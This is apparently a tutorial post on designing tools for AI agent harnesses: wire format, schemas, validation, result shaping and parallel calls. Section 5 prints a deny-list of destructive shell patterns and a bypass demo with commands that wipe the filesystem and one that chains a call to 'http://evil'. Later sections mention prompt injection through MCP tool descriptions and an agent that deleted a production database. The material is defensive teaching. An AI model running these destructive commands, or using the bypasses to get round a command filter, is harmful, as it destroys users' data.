# 06 - Tools as the agent's hands: bash, code, and schemas

> **TL;DR.** Tools are the act step of the loop, the model's only way to change the world, and a tool is a contract written in tokens. A few general-purpose tools, above all bash and code execution, beat a zoo of narrow ones; a bespoke tool is kept where a general one cannot control the permission or the shape of the result. Reliability comes from a schema that teaches the model when *not* to call, and from validating every call against it before anything runs, so that a bad call returns as an error the model can fix rather than a crash.
>
> **Prerequisites:** [Post 03 - The agent loop: ReAct, control loops, and stopping](../03-the-agent-loop/index.md).
> **Safe to skip?** Skip it if the reader can already validate a tool call against its schema before dispatch, say why a deny-list is not a security boundary, return every tool outcome as a string with its exit status, and answer parallel calls in one message matched by id.
>
> **After reading, you will be able to:**
>
> - Explain a tool call as a request on the wire, a `tool_use` block answered by a `tool_result` with its id, and say what the harness owns between the two.
> - Argue for bash and code execution as general-purpose tools over a zoo of narrow ones, and name when a bespoke tool still wins.
> - Design a tool schema that teaches the model when not to call it, and say what its definition costs on every call.
> - Validate every tool call against its schema before executing it, and tell a schema-invalid, a semantically wrong and a dangerous call apart.
> - Shape a tool's return value, answer parallel tool calls in one well-formed message, and curate the fewest tools that cover the space.

![The act step opened into a pipeline: a tool_use block passes a purple schema check and a purple deny-list, then the orange runner and result shaping, and leaves as a tool_result. Three calls stop at three places, each with the string the loop reads back.](diagrams/01-tool-dispatch.svg)

*Dispatch is validate, then execute; every call, good or bad, comes back to the model as a string it can read.*

---

## 1. The question: what makes a tool call reliable?

[Post 03](../03-the-agent-loop/index.md) drew the loop as reason, act, observe. This post is the **act** step in depth, and it asks why a few general-purpose tools beat a zoo of bespoke ones, and what makes a tool call reliable. A tool is whatever the harness lets the model invoke to affect the world: run a shell command, call an application programming interface (API), read or write a file. Tools are component 02 of the eleven in [post 02](../02-anatomy-of-a-harness/index.md), one of the four that feed the loop.

Two properties make tools the delicate part of the harness. They are the model's only *causal* connection to the world, so their design decides what the agent can do and what it can do by mistake, the blast radius of the destructive-action mode of [post 05](../05-agent-failure-modes/index.md). And every tool the model *might* call is described to it on *every* call, ahead of the conversation: tokens it reads each turn, a cost `ctx-015` works out from the token side.

With prompt caching, the tool block sits at the front of the cached prefix, so on a cache hit it is re-read at 0.1 times the base input price on most Claude models, and less on some (Anthropic, prompt caching documentation, consulted October 2026). The larger tax of an over-stuffed tool list is therefore on the model's *choice*, not the invoice: more menu to read, more near-duplicates to tell apart, more chances to reach for the wrong thing.

---

## 2. What a tool call actually is

Before any design advice, the wire format. The model never *performs* an action. It emits a request, a block naming a tool and carrying an input object; the harness decides what to do about it and sends back an observation as the next message. In the Anthropic Messages API the exchange is two messages, the model's turn and the harness's reply:

```json
[
  {"role": "assistant", "content": [
    {"type": "tool_use", "id": "toolu_01A", "name": "bash",
     "input": {"command": "pytest -q tests/test_parser.py"}}]},
  {"role": "user", "content": [
    {"type": "tool_result", "tool_use_id": "toolu_01A",
     "is_error": false,
     "content": "2 failed, 11 passed in 0.44s"}]}
]
```

Three things follow. The `id` and `tool_use_id` are the only link between a request and its answer, which makes the batching of section 9 possible. The `is_error` flag reports a failure inside the normal channel rather than by throwing. And everything between the two blocks, the validation, the sandbox, the truncation, the timing, is harness code: the model's causal reach ends at the request.

The order in which a request is assembled matters too. The provider renders tools, then the system prompt, then the messages (Anthropic, prompt caching documentation, consulted October 2026), which is the literal sense in which tool definitions arrive ahead of the user's request.

---

## 3. The general-purpose-tool argument

The instinct when building an agent is to enumerate: `read_file`, `write_file`, then list, search, move, copy, delete, until fifty tools make a combinatorial mess. The common advice now is the opposite: give the model a handful of general-purpose tools and let it compose them. Addy Osmani's "Agent Harness Engineering" (April 2026) says "bash plus code execution has become the default general-purpose strategy for autonomous problem solving", and Trivedy's anatomy of a harness (LangChain blog, 10 March 2026) lists bash and code among a harness's core capabilities. This is practitioners' argument, not a measurement; section 10 gives the one measurement that bears on it.

The single most powerful tool is **bash**, or equivalently code execution. Anything fifty narrow file tools could do, a shell command does, and many things they could not, because the model can *compose*: pipe, loop, chain, write a throwaway script. Four advantages follow:

- **A tiny schema.** `bash` takes one string. Fifty tools are fifty definitions the model reads on every call.
- **Nothing to choose between.** With fifty overlapping tools the model must *pick*, and picking wrong is a failure of its own (section 10). With `bash` there is one obvious surface.
- **Patterns the model was trained on.** Models have seen enormous amounts of shell and Python, and far less of a team's `move_file_v2` wrapper. Osmani summarises Simon Willison's view: "agents already excel at shell commands; most tasks collapse to a few well-chosen CLI invocations" (Osmani, 2026), where CLI is the command-line interface.
- **One boundary to build, not fifty.** One general surface is one place to put a gate instead of fifty ([post 14](../14-permissions-sandboxes/index.md)). It does not make the gate *narrow*: that boundary must now contain arbitrary code, section 5's subject.

This does not mean *only* bash: a few structured tools earn their place beside the shell. The rule is **the fewest general tools that cover the space**, and the next section says when a bespoke one wins.

---

## 4. When a bespoke tool still wins

Four questions decide it. None of them is "would a shell command work", because a shell command nearly always would.

| Ask this | A general tool fits when | A bespoke tool fits when |
| --- | --- | --- |
| Is there a process to spawn? | The agent runs in a container, a workstation, or a continuous-integration (CI) runner with a real shell. | It runs in a browser page, a serverless function, or a mobile client with no process to fork. |
| What comes back? | Text a person would read: logs, diffs, test output, a file listing. | Typed data code consumes downstream: a row, an identifier, a decision a service acts on. |
| Does the action need its own permission? | The whole surface can be gated together, or the action needs no approval at all. | The action must be approvable on its own: a harness can permit `issue_refund` and refuse `bash`, but cannot permit half a shell ([post 14](../14-permissions-sandboxes/index.md)). |
| Has the model seen this interface? | Constantly: shell, Python, `git`, `curl`, standard operating-system commands. | Never: an internal API invented last quarter, with no training precedent to fall back on. |

The permission row is the one teams discover late. To a human approver "allow this bash command" is a decision about a string, not a capability; a bespoke `issue_refund` with a capped amount is a decision a human can actually make, and `ctx-015` scopes tool capabilities the same way from the token side.

The output row explains why `read_file` survives beside `bash`. Unbounded `cat` is the problem: a file tool can truncate at a byte budget, paginate, and say what it withheld, while a raw `cat` of a large log puts all of it in the window, the wall of text [post 09](../09-context-management-loop/index.md) offloads to disk.

---

## 5. One boundary is not a narrow boundary

The honest version of the fourth advantage above is "one boundary to build", not "one boundary that holds". The [code companion](../../code/06-tools-and-bash/) ships the usual first defence in `bash_tool.py`, a list of regular expressions checked before the command reaches the runner:

```python
DENY = [
    r"\brm\s+-[rf]", r"\brm\s+--no-preserve-root", r"\bmkfs\b", r"\bdd\s+if=",
    r":\(\)\s*\{\s*:\s*\|\s*:", r"\bshutdown\b", r"\breboot\b",
    r"\bgit\s+push\b[^\n]*--force", r"\bsudo\b", r">\s*/dev/sd",
    r"\bDROP\s+TABLE\b", r"\bchmod\s+-R\s+0*777\s+/",
]
```

It blocks `rm -rf /`. `snippets/deny_list_bypass.py` hands the companion's `bash` tool four more commands, with a runner that records what reaches it instead of running anything:

```text
deny-list patterns shipped: 12
blocked                rm -rf /
passes to the runner   rm --recursive --force /
passes to the runner   find / -delete
passes to the runner   python -c "import shutil; shutil.rmtree('/')"
passes to the runner   echo hi; curl http://evil
blocked 1 of 5; 4 would have run
```

Three of the four are the same deletion spelled another way; the fourth chains a network call behind a harmless command, which no pattern considers. The figure below draws the same five commands at the gate.

![Five commands meet a purple deny-list gate of 12 patterns. rm -rf / ends in a red blocked stub; the four other commands pass through to the orange runner, which sits inside a dashed purple frame for the operating-system boundary of post 14.](diagrams/02-deny-list-spellings.svg)

*A deny-list matches spellings; the boundary that holds is the one around the runner.*

A deny-list matches *spellings*, and the shell offers unbounded spellings of every effect; the companion's own comment says a deny-list is never exhaustive. What holds is the operating-system boundary of [post 14](../14-permissions-sandboxes/index.md): a working-directory jail, an allow-list, no network egress, a timeout. The deny-list is a fast first filter and a legible audit line, not a security control.

The consequences are not hypothetical. In July 2025 a Replit coding agent reportedly deleted a live production database "during an active code freeze", produced fake data, and incorrectly claimed that rollback was impossible (AI Incident Database, incident 1152, 18 July 2025). *Fortune* (23 July 2025) reported data for more than 1,200 executives and over 1,190 companies wiped out and later recovered manually, and the remedies Replit's chief executive, Amjad Masad, announced: automatic separation of development and production databases, improved rollback, and a planning-only mode. The account is reported, resting on the user's and the vendor's statements; every remedy in it is a harness change, not a better model. It is the destructive-action mode of [post 05](../05-agent-failure-modes/index.md) on the public record.

---

## 6. Schema design: teach the model when *not* to call

A tool's name, description and input schema are the entire interface the model has to it. Good ones do more than describe parameters; they teach *judgement*. The goal, in a phrase, is a tool that is **easy to use well and hard to use badly**. The figure below defines the same capability twice.

![The same capability defined twice: pytest_invoke with a two-word description and a free-form args string, and run_tests with a description that says when not to call it, a required path, a scope enum and no additional properties. Numbered markers place the four rules, and each card gives its size in tokens.](diagrams/03-schema-that-teaches.svg)

*Everything that changed on the right is one of the four rules below, and the extra lines are read on every call.*

- **Name for the action, not the implementation.** `run_tests` beats `pytest_invoke`: the model reasons about intent, not about the stack underneath.
- **Write the description for the caller, not the maintainer.** Say what the tool is *for*, what it returns, and, most valuable, *when not to call it*. "Use for arithmetic on numbers already in hand; do not use to look up facts" prevents a class of misuse before it happens.
- **Constrain the input.** A tight schema (`enum` instead of a free string, `required` fields, `"additionalProperties": false`) is documentation the model cannot ignore and a validator the harness gets for free (section 7).
- **Return errors as information.** A tool's output, errors included, is an *observation* the model reads next turn. "error: file not found: /tmp/x" is a correctable signal; an exception that escapes and ends the loop is not.

Written out in JavaScript Object Notation (JSON), the right-hand definition is thirteen lines:

```json
{
  "name": "run_tests",
  "description": "Run the suite and return the failures. Use after any code edit. Do NOT use to read a file: use bash for that.",
  "input_schema": {
    "type": "object",
    "properties": {
      "path":  {"type": "string", "description": "File or directory to test."},
      "scope": {"type": "string", "enum": ["unit", "integration", "all"]}
    },
    "required": ["path"],
    "additionalProperties": false
  }
}
```

That tool is the verification gate of [post 11](../11-verification-loops/index.md) seen from its schema side. `snippets/run_tests_schema.py` prints what it costs and what its schema refuses. The size is a `tiktoken` `o200k_base` estimate (each provider tokenises and wraps definitions its own way), the run of twelve such tools over forty turns is illustrative, and the rate is the Claude Sonnet 4.6 input rate of 3 dollars per million tokens (Anthropic pricing page, consulted October 2026):

```text
run_tests definition: 105 tokens (o200k_base estimate)
12 tools of that size: 1,260 tokens of tool block per call
re-read on 40 turns: 50,400 tokens per run
at $3.00/M uncached: $0.1512; as cache reads: $0.0151
{"path": "tests/", "scope": "unit"} -> valid
{"scope": "everything"} -> $: missing required property 'path'; $.scope: 'everything' is not one of ['unit', 'integration', 'all']
```

By hand: $105 \times 12 = 1{,}260$ tokens a call, $1{,}260 \times 40 = 50{,}400$ a run, and $50{,}400 \times 3 \times 0.1 / 10^6 \approx 0.015$ dollars as cache reads. The money is a rounding error; forty readings of a menu the model must scan are not. Modifying a tool's name, description or parameters also invalidates the entire cache (Anthropic, prompt caching documentation, consulted October 2026), so a tool block is versioned between deployments, not tuned per request.

The line that earns its place most reliably is the negative one, *do not use this to read a file*, because it is the only part of a description that prevents a call rather than shaping one. The aim is the *shortest* description that still teaches when not to call: a pilot's checklist, not a manual.

One property of descriptions is specific to harnesses: once tools arrive from third-party Model Context Protocol (MCP) servers, a description is text somebody else wrote. Osmani relays HumanLayer's warning that "tool descriptions populate the prompt, so any MCP server you install is trusted text the model will read", and "a sloppy or malicious MCP can prompt-inject your agent before you've typed anything" (Osmani, 2026). Reviewing a tool description is a security review ([post 14](../14-permissions-sandboxes/index.md)).

---

## 7. Validation is the tool contract

Because the model generates tool calls as text, it can generate calls that violate the schema: a missing field, a wrong type, a hallucinated parameter. Providers now push back on this from the generation side. OpenAI's Structured Outputs (6 August 2024) converts the supplied JSON Schema into a context-free grammar and masks invalid tokens during sampling; on OpenAI's evaluation of complex JSON schema following, `gpt-4o-2024-08-06` with Structured Outputs scores 100%, against less than 40% for `gpt-4-0613` (OpenAI, 2024).

That does not retire harness-side validation, for three reasons. Strict mode covers a *subset* of JSON Schema: every object sets `additionalProperties: false` and lists every key in `required`, so an optional field becomes one that may be `null` (OpenAI, structured outputs guide, consulted October 2026). It applies only to calls the provider generated in strict mode, not to an MCP server's arguments, a locally hosted model, a replayed trace or a test fixture. And it guarantees *shape*, not *sense*: the ladder of output guarantees in `ctx-021` ends at grammar-constrained decoding, which fixes the shape and leaves the meaning to the harness.

So dispatch is two steps, always in this order: **validate the input against the schema, then execute only if it passes**, as the figure at the top draws. A harness has to tell three kinds of wrongness apart, because each is caught in a different place. `snippets/three_gates.py` sends one call of each kind through the companion's `dispatch` and `bash` tool, with an injected runner that answers as `cat` would for a missing file and runs nothing:

```text
schema-invalid: {'cmd': 'ls'}
  loop sees: error: invalid input: $: missing required property 'command'; $: unexpected property 'cmd'
  runner reached: no
valid, semantically wrong: {'command': 'cat /tmp/nope'}
  loop sees: (exit 1) cat: /tmp/nope: No such file or directory
  runner reached: yes
valid and dangerous: {'command': 'rm -rf /'}
  loop sees: blocked: command matches a deny-list rule (\brm\s+-[rf])
  runner reached: no
commands handed to the runner: ['cat /tmp/nope']
```

Only the first call is validation's job: the second is caught by the tool at run time, the third by a deny-list and then a sandbox ([post 13](../13-hooks-enforcement/index.md), [post 14](../14-permissions-sandboxes/index.md)), three gates rather than one, which is the bridge into Part III. The first gate turns a would-be crash into a *correctable error*: the model reads the string next turn and fixes the call, where a malformed call reaching the execution code would throw and end the turn.

The companion's `registry.py` holds the whole discipline in a dozen lines:

```python
    def dispatch(self, name: str, tool_input: dict) -> str:
        """Validate, then execute. Returns an observation string; never raises."""
        tool = self._tools.get(name)
        if tool is None:
            return f"error: unknown tool '{name}'"
        problems = validate(tool_input, tool.input_schema)
        if problems:
            return "error: invalid input: " + "; ".join(problems)
        try:
            return tool.run(tool_input)
        except Exception as e:  # a tool must not crash the loop
            return f"error: {type(e).__name__}: {e}"
```

Every branch returns a string, deliberately: unknown tool, invalid input, tool exception and success are all *observations*, so the loop needs no special case for any of them. The error says what was wrong and where (`$: missing required property 'command'`), and the model's next turn is a patch written against it, so an error message is an interface, not a log line. The companion leaves the `is_error` flag of section 2 unset; [post 03](../03-the-agent-loop/index.md) shows it added.

---

## 8. The return value is the other half of the contract

Everything so far is inbound. In a running harness the *result* is what fills the window and what the next turn reasons over, so it deserves as much design as the schema. Four rules govern it; the first two are the last two lines of the companion's `bash` tool:

```python
        prefix = "" if code == 0 else f"(exit {code}) "
        return prefix + (output if output else "(no output)")
```

**Surface the exit status; do not swallow it.** A failing command's stderr returned as a bare string carries nothing that marks it as a failure. Prefixing gives `(exit 2) boom`, which is unambiguous.

**Never return an empty string.** An empty observation gives the model nothing to tell a quiet success from a broken tool, and a retry is the natural response. `(no output)` is two words that remove the doubt.

**Cap the result and return a pointer, not the stream.** A long build log is better written to disk and returned as `{"ok": true, "log_path": "/tmp/build-7.log"}`, the offloading move of [post 09](../09-context-management-loop/index.md). A definition is re-read once a turn, cheaply once cached; a *result* joins the history and is re-sent on every later turn. In post 03's illustrative run, one 20,000-token log read at turn 5 of twelve adds $7 \times 20{,}000 = 140{,}000$ input tokens.

**Treat the result as untrusted text.** It re-enters the window as content the model reads, so a fetched web page or a third-party server's response can carry an instruction aimed at the agent ([post 14](../14-permissions-sandboxes/index.md)).

The symmetry is worth naming: the description tells the model when to call, and the return value tells it what happened. The same reader reads both, in the same window.

---

## 9. Parallel tool calls

A model can request *several* tool calls in a single turn: read three files at once, run two independent checks. The assistant message carries several `tool_use` blocks and stops with `stop_reason` set to `tool_use`. "The API doesn't prescribe an execution order": the harness may run the calls concurrently, in sequence, or in any mixture (Anthropic, "Parallel tool use", consulted October 2026).

The reply format is where harnesses go wrong, and it is precise. The same page says to "return one `tool_result` for each `tool_use` block, all together in the next user message", matched by `tool_use_id`, with every `tool_result` block before any text content in that message. For a call the harness chose not to run, because it ran the batch in sequence and an earlier call failed, it still returns a result with `is_error: true` and a brief explanation rather than dropping it.

- **Match every result to its call by id.** Correspondence rides on `tool_use_id`, not on position. Order is a convenience; the id is the contract.
- **Parallelise only independent calls.** Reading three files is independent; "create a file, then read it" is not. The page's own heuristic: independent, read-only operations are usually safe in parallel, while tools with side effects, shared state or ordering requirements may be better run in sequence.
- **Keep the history well-formed.** The page calls formatting results incorrectly the most common issue, and a separate user message for each result "teaches" the model to avoid parallel calls. This bug never raises: it shows up only as runs that have quietly become slower.
- **Know the off switch.** `disable_parallel_tool_use: true` goes *inside* the `tool_choice` object, not at the top level of the request; with the default `auto` choice the model then calls at most one tool per response.

The prize is latency and only latency. With illustrative figures, three independent reads at 200 ms each take $3 \times 200 = 600$ ms in sequence and about 200 ms batched; on a forty-turn run where twenty turns open such a batch, that is $20 \times 600$ ms, 12 seconds of tool time, against 4 seconds, with no change to what the agent concludes. As with streaming in [post 03](../03-the-agent-loop/index.md), the serial version is made correct first.

---

## 10. Curate: the fewest tools that cover the space

Pulling the sections above into one rule: **treat the tool list as a budget, not a pantry.** Every tool added is definition tokens on every call, one more choice for the model, and one more surface to secure. Osmani's form is "ten focused tools outperform fifty overlapping ones because the model can hold the menu in its head" (Osmani, 2026), an argument from practice with no count behind the ten or the fifty.

The nearest measurement is RAG-MCP, retrieval-augmented generation (RAG) applied to MCP tool selection (Gan and Sun, arXiv, 6 May 2025). On the web-search subset of MCPBench, with `qwen-max-0125` choosing among MCP server descriptions, prompting with every description selected the right server 13.62% of the time; retrieving only the best match first raised it to 43.13%, and the average prompt fell from 2,133.84 to 1,084.00 tokens, about half (the abstract says "over 50%"; the table gives 49%). Only the tool prompt changed, with the model and the benchmark fixed, so on this series' scale the result is firm, for one model and one task family in a preprint; the paper's stress test also shows selection failing more often as the pool of servers grows. The figure below draws both measurements.

![Two cited comparisons from the RAG-MCP paper, drawn as hollow marks with the word cited and the grade firm: tool-selection accuracy of 13.62% with every MCP description in the prompt against 43.13% with retrieval first, and average prompt tokens of 2,133.84 against 1,084.00.](diagrams/04-rag-mcp.svg)

*A shorter menu chose right three times as often and cost half the prompt.*

Read the numbers as a shape, not constants: selection degrades as the catalogue grows, and the remedy is a shorter menu, not a bigger window. When a harness must expose many capabilities, such as dozens of MCP servers, the answer is **progressive disclosure**, loading a tool only when the task needs it, the subject of [post 07](../07-skills-mcp-runtime/index.md).

---

## 11. Make it run

The [code companion](../../code/06-tools-and-bash/) is three modules and an offline demo: `schema.py`, a 66-line validator for a JSON Schema *subset* (`type`, `properties`, `required`, `enum`, `additionalProperties`, `items`); `registry.py`, holding `Tool` and the `ToolRegistry` whose `dispatch` section 7 quotes; and `bash_tool.py`, one general tool with the deny-list of section 5. Its fifteen tests need no API key and no real shell, because the runner is injected, which is how a suite asserts that a dangerous command was refused without executing it. From inside `code/06-tools-and-bash/`:

```bash
uv run --extra dev pytest -q
uv run python -m tools
```

The first runs the fifteen tests; the second dispatches a safe command, a dangerous one and a malformed one. [Post 24](../24-build-minimal-harness/index.md) ships the same `dispatch` verbatim in Build #1, with the three modules folded into one alongside a `write_file` tool.

The lab for this post adds one deny-listed command and one schema violation and watches each be rejected before execution. `snippets/lab_gate.py` holds the two tests, written against the companion as it stands and ready to paste into its suite; from the series root, `uv run python posts/06-tools-bash-code/snippets/lab_gate.py` prints:

```text
test_deny_listed_command_never_runs: passed
  blocked: command matches a deny-list rule (\bDROP\s+TABLE\b)
test_schema_violation_never_runs: passed
  error: invalid input: $.command: expected string, got integer
```

Each test also asserts that the recording runner was never called. The other three snippets, `three_gates.py`, `deny_list_bypass.py` and `run_tests_schema.py`, run the same way and print the outputs quoted in sections 7, 5 and 6.

---

## 12. What can go wrong?

The mistakes that building the act step produces, with the symptom of each.

- **A malformed call reaches the tool.** With no schema check, `{"cmd": "ls"}` reaches a tool that reads `args["command"]`, and the run ends on a `KeyError` stack trace instead of an observation the model could have fixed.
- **A deny-list trusted as the boundary.** The audit log shows the deny-list firing on `rm -rf /`, and the incident is a `find / -delete` that nothing stopped.
- **An exit status swallowed.** A failing build returns its error text with no marker, and the model reports success on the strength of a string that said otherwise.
- **An unbounded result.** One log dumped into the window is re-sent on every later turn, and the run's input tokens jump with nothing new in the task.
- **One message per parallel result.** The history is valid enough to run, and over the following turns the model asks for one tool at a time.

---

## Common pitfalls

1. **A bespoke tool for every action.** Fifty narrow tools cost more context, give the model more to choose among, and multiply the attack surface; keep a bespoke tool only where one of the four questions of section 4 demands it.
2. **Assuming strict mode is enough.** It covers a JSON Schema subset, only calls the provider generated in strict mode, and only shape; semantic and safety checks stay with the harness.
3. **Letting a tool raise.** A tool's errors are observations: return "error: ..." as a string and never let an exception escape into the loop.
4. **Confusing token cost with choice cost.** Caching makes a stable tool block cheap to re-read, so an over-stuffed list taxes the model's choice more than the invoice; a tool *result* is re-sent on every later turn, which is why an unbounded log is the most expensive thing a tool returns.
5. **Parallelising dependent calls.** "Create a file, then read it" in one batch can read before the write lands; parallelise reads, serialise writes.

---

## Further reading

- Anthropic, "Tool use" and "Parallel tool use", documentation (consulted October 2026). Pairing by `tool_use_id`, one message of results, `is_error`, and `disable_parallel_tool_use`.
- Anthropic, "Prompt caching", documentation (consulted October 2026). The prefix order, the 0.1 times cache-read price, and what a tool edit invalidates.
- OpenAI, "Introducing Structured Outputs in the API" (6 August 2024) and the structured outputs guide (consulted October 2026). Constrained decoding and the supported schema subset.
- Tiantian Gan and Qiyao Sun, "RAG-MCP: Mitigating Prompt Bloat in LLM Tool Selection via Retrieval-Augmented Generation" (arXiv, 6 May 2025). The 13.62% and 43.13% tool-selection measurement of section 10.
- Addy Osmani, "Agent Harness Engineering" (April 2026). Bash as the general-purpose default, "ten focused tools", and descriptions as an injection surface.
- AI Incident Database, incident 1152 (18 July 2025), and *Fortune* (23 July 2025). The Replit production-database deletion and the harness changes that followed it.
- ai-boost, awesome-harness-engineering (GitHub, 2026), the Tool Design section. Curated sources on tool design.
- `ctx-015` (`context-engineering`): tools and MCP from the token side, the cost of tool definitions; `ctx-021`: the ladder of output guarantees.

Full citations are in [REFERENCES.md](../../REFERENCES.md).

---

## What to read next

- **[Post 07 - Skills and MCP in the runtime](../07-skills-mcp-runtime/index.md):** how to expose many capabilities without paying for all their schemas at once, by progressive disclosure.
- **[Post 08 - State and the filesystem: durable memory and git as state](../08-state-filesystem-git/index.md):** what the shell changes on disk, kept as durable state and made reversible under git.
